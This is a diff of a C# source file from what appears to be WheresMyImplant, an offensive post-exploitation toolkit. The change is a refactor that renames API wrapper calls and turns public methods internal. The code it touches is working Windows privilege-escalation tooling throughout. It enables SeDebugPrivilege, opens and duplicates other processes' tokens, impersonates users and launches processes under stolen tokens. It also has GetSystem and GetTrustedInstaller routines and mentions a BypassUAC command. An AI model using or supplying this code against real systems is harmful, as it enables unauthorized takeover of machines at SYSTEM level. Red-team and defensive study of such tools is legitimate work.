@@ -8,6 +8,8 @@ using System.Security;
 using System.Security.Principal;
 using System.Text;
 
+using Unmanaged;
+
 namespace WheresMyImplant
 {
     class Tokens : Base
@@ -26,7 +28,7 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Tokens()
+        internal Tokens()
         {
             phNewToken = new IntPtr();
             hExistingToken = new IntPtr();
@@ -38,7 +40,7 @@ BypassUAC            <process_id> <new_process>";
             }
 
             currentProcessToken = new IntPtr();
-            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
+            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
             SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME);
         }
 
@@ -46,32 +48,32 @@ BypassUAC            <process_id> <new_process>";
         ////////////////////////////////////////////////////////////////////////////////
         ~Tokens()
         {
-            Unmanaged.CloseHandle(phNewToken);
-            Unmanaged.CloseHandle(hExistingToken);
+            kernel32.CloseHandle(phNewToken);
+            kernel32.CloseHandle(hExistingToken);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public void GetHelp()
+        internal void GetHelp()
         {
             WriteOutputBad(helpMessage);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
+        internal Boolean StartProcessAsUser(Int32 processId, String newProcess)
         {
             GetPrimaryToken((UInt32)processId, "");
             if (hExistingToken == IntPtr.Zero)
             {
                 return false;
             }
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
-                        (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
+                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                         IntPtr.Zero,
-                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        Enums.TOKEN_TYPE.TokenPrimary,
+                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                        Winnt.TOKEN_TYPE.TokenPrimary,
                         out phNewToken
             ))
             {
@@ -88,19 +90,19 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public virtual Boolean ImpersonateUser(Int32 processId)
+        internal virtual Boolean ImpersonateUser(Int32 processId)
         {
             GetPrimaryToken((UInt32)processId, "");
             if (hExistingToken == IntPtr.Zero)
             {
                 return false;
             }
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
-                        (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
+                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                         IntPtr.Zero,
-                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        Enums.TOKEN_TYPE.TokenPrimary,
+                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                        Winnt.TOKEN_TYPE.TokenPrimary,
                         out phNewToken
             ))
             {
@@ -108,7 +110,7 @@ BypassUAC            <process_id> <new_process>";
                 return false;
             }
             WriteOutputGood("Duplicate Token Handle: "+ phNewToken.ToInt32());
-            if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
+            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
             {
                 GetError("ImpersonateLoggedOnUser: ");
                 return false;
@@ -118,7 +120,7 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean GetSystem(String newProcess)
+        internal Boolean GetSystem(String newProcess)
         {
             SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
             String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
@@ -136,7 +138,7 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean GetSystem()
+        internal Boolean GetSystem()
         {
             SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
             String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
@@ -154,7 +156,7 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean GetTrustedInstaller(String newProcess)
+        internal Boolean GetTrustedInstaller(String newProcess)
         {
             WriteOutputGood("Getting NT AUTHORITY\\SYSTEM privileges");
             GetSystem();
@@ -178,7 +180,7 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean GetTrustedInstaller()
+        internal Boolean GetTrustedInstaller()
         {
             WriteOutputNeutral("Getting NT AUTHORITY\\SYSTEM privileges");
             GetSystem();
@@ -207,10 +209,10 @@ BypassUAC            <process_id> <new_process>";
             WriteOutputGood("CreateProcessWithLogonW");
             IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
             IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
-            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
-            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
-            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
-            if (!Unmanaged.CreateProcessWithLogonW(
+            Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO();
+            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Winbase._STARTUPINFO));
+            Winbase._PROCESS_INFORMATION processInformation = new Winbase._PROCESS_INFORMATION();
+            if (!advapi32.CreateProcessWithLogonW(
                 "i",
                 "j",
                 "k",
@@ -219,7 +221,7 @@ BypassUAC            <process_id> <new_process>";
                 arguments,
                 0x04000000,
                 IntPtr.Zero,
-                "C:\\Windows\\System32",
+                Environment.SystemDirectory,
                 ref startupInfo,
                 out processInformation
             ))
@@ -239,15 +241,15 @@ BypassUAC            <process_id> <new_process>";
             Console.WriteLine("CreateProcessWithTokenW");
             IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
             IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
-            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
-            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
-            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
-            if (!Unmanaged.CreateProcessWithTokenW(
+            Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO();
+            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Winbase._STARTUPINFO));
+            Winbase._PROCESS_INFORMATION processInformation = new Winbase._PROCESS_INFORMATION();
+            if (!advapi32.CreateProcessWithTokenW(
                 phNewToken,
-                Enums.LOGON_FLAGS.NetCredentialsOnly,
+                advapi32.LOGON_FLAGS.NetCredentialsOnly,
                 lpProcessName,
                 lpProcessArgs,
-                Enums.CREATION_FLAGS.NONE,
+                Winbase.CREATION_FLAGS.NONE,
                 IntPtr.Zero,
                 IntPtr.Zero,
                 ref startupInfo,
@@ -264,7 +266,7 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public void EnumerateTokens(String userAccount)
+        internal void EnumerateTokens(String userAccount)
         {
             Int32 size = 0;
             List<ManagementObject> systemProcesses = new List<ManagementObject>();
@@ -301,10 +303,10 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public virtual void GetPrimaryToken(UInt32 processId, String name)
+        internal virtual void GetPrimaryToken(UInt32 processId, String name)
         {
             //Originally Set to true
-            IntPtr hProcess = Unmanaged.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
+            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
             if (hProcess == IntPtr.Zero)
             {
                 return;
@@ -312,11 +314,11 @@ BypassUAC            <process_id> <new_process>";
             WriteOutputGood("Recieved Handle for: "+ name + "("+ processId + ")");
             WriteOutputGood("Process Handle: "+ hProcess.ToInt32());
 
-            if (Unmanaged.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
+            if (kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
             {
                 WriteOutputGood("Primary Token Handle: "+ hExistingToken.ToInt32());
             }
-            Unmanaged.CloseHandle(hProcess);
+            kernel32.CloseHandle(hProcess);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -325,18 +327,18 @@ BypassUAC            <process_id> <new_process>";
         {
             IntPtr hToken = new IntPtr();
             WriteOutputNeutral("Opening Thread Token");
-            if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
+            if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
             {
                 WriteOutputBad("OpenTheadToken Failed");
                 WriteOutputNeutral("Impersonating Self");
-                if (!Unmanaged.ImpersonateSelf(Enums.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+                if (!advapi32.ImpersonateSelf(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                 {
                     GetError("ImpersonateSelf");
                     return IntPtr.Zero;
                 }
                 WriteOutputGood("Impersonated Self");
                 WriteOutputNeutral("Retrying");
-                if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
+                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
                 {
                     GetError("OpenThreadToken");
                     return IntPtr.Zero;
@@ -350,12 +352,12 @@ BypassUAC            <process_id> <new_process>";
         //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
         //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
         ////////////////////////////////////////////////////////////////////////////////
-        public void SetTokenPrivilege(ref IntPtr hToken, String privilege, Boolean bEnable)
+        internal void SetTokenPrivilege(ref IntPtr hToken, String privilege, Boolean bEnable)
         {
             WriteOutputNeutral("Adjusting Token Privilege");
             ////////////////////////////////////////////////////////////////////////////////
-            Structs._LUID luid = new Structs._LUID();
-            if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
+            Winnt._LUID luid = new Winnt._LUID();
+            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
             {
                 GetError("LookupPrivilegeValue");
                 return;
@@ -363,18 +365,18 @@ BypassUAC            <process_id> <new_process>";
             WriteOutputGood("Recieved luid");
 
             ////////////////////////////////////////////////////////////////////////////////
-            Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
+            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES();
             luidAndAttributes.Luid = luid;
             luidAndAttributes.Attributes = 0;
 
-            Structs._TOKEN_PRIVILEGES newState = new Structs._TOKEN_PRIVILEGES();
+            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES();
             newState.PrivilegeCount = 1;
             newState.Privileges = luidAndAttributes;
 
-            Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
+            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
             WriteOutputGood("AdjustTokenPrivilege Pass 1");
-            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 GetError("AdjustTokenPrivileges - 1");
                 return;
@@ -392,9 +394,9 @@ BypassUAC            <process_id> <new_process>";
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            Structs._TOKEN_PRIVILEGES kluge = new Structs._TOKEN_PRIVILEGES();
+            Winnt._TOKEN_PRIVILEGES kluge = new Winnt._TOKEN_PRIVILEGES();
             WriteOutputGood("AdjustTokenPrivilege Pass 2");
-            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
+            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
             {
                 GetError("AdjustTokenPrivileges - 2");
                 return;
@@ -408,12 +410,12 @@ BypassUAC            <process_id> <new_process>";
         //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
         //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
         ////////////////////////////////////////////////////////////////////////////////
-        public void SetTokenPrivilege(ref IntPtr hToken, String privilege)
+        internal void SetTokenPrivilege(ref IntPtr hToken, String privilege)
         {
             WriteOutputGood("Adjusting Token Privilege");
             ////////////////////////////////////////////////////////////////////////////////
-            Structs._LUID luid = new Structs._LUID();
-            if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
+            Winnt._LUID luid = new Winnt._LUID();
+            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
             {
                 GetError("LookupPrivilegeValue");
                 return;
@@ -421,18 +423,18 @@ BypassUAC            <process_id> <new_process>";
             WriteOutputGood("Recieved luid");
 
             ////////////////////////////////////////////////////////////////////////////////
-            Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
+            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES();
             luidAndAttributes.Luid = luid;
             luidAndAttributes.Attributes = Constants.SE_PRIVILEGE_ENABLED;
 
-            Structs._TOKEN_PRIVILEGES newState = new Structs._TOKEN_PRIVILEGES();
+            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES();
             newState.PrivilegeCount = 1;
             newState.Privileges = luidAndAttributes;
 
-            Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
+            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
             WriteOutputNeutral("AdjustTokenPrivilege");
-            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 GetError("AdjustTokenPrivileges");
                 return;
@@ -444,14 +446,14 @@ BypassUAC            <process_id> <new_process>";
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public void EnumerateTokenPrivileges(IntPtr hToken)
+        internal void EnumerateTokenPrivileges(IntPtr hToken)
         {
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 TokenInfLength = 0;
             WriteOutputNeutral("Enumerating Token Privileges");
-            Unmanaged.GetTokenInformation(
+            advapi32.GetTokenInformation(
                 hToken, 
-                Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
+                Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                 IntPtr.Zero, 
                 TokenInfLength, 
                 out TokenInfLength
@@ -466,9 +468,9 @@ BypassUAC            <process_id> <new_process>";
             IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength) ;
             
             ////////////////////////////////////////////////////////////////////////////////
-            if (!Unmanaged.GetTokenInformation(
+            if (!advapi32.GetTokenInformation(
                 hToken, 
-                Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
+                Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                 lpTokenInformation, 
                 TokenInfLength, 
                 out TokenInfLength))
@@ -477,7 +479,7 @@ BypassUAC            <process_id> <new_process>";
                 return;
             }
             WriteOutputNeutral("GetTokenInformation - Pass 2");
-            Structs._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Structs._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Structs._TOKEN_PRIVILEGES_ARRAY));
+            Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Winnt._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Winnt._TOKEN_PRIVILEGES_ARRAY));
             WriteOutputGood("Enumerated "+ tokenPrivileges.PrivilegeCount + "Privileges");
 
             ////////////////////////////////////////////////////////////////////////////////
@@ -487,7 +489,7 @@ BypassUAC            <process_id> <new_process>";
                 Int32 cchName = 0;
                 IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                 Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);
-                Unmanaged.LookupPrivilegeName(null, lpLuid, null, ref cchName);
+                advapi32.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                 if (cchName < 0 || cchName > Int32.MaxValue)  
                 {
                     GetError("LookupPrivilegeName "+ cchName);
@@ -495,7 +497,7 @@ BypassUAC            <process_id> <new_process>";
                 }
 
                 lpName.EnsureCapacity(cchName + 1);
-                if (Unmanaged.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
+                if (advapi32.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                 {
                     WriteOutputNeutral(""+ lpName.ToString());
                 }
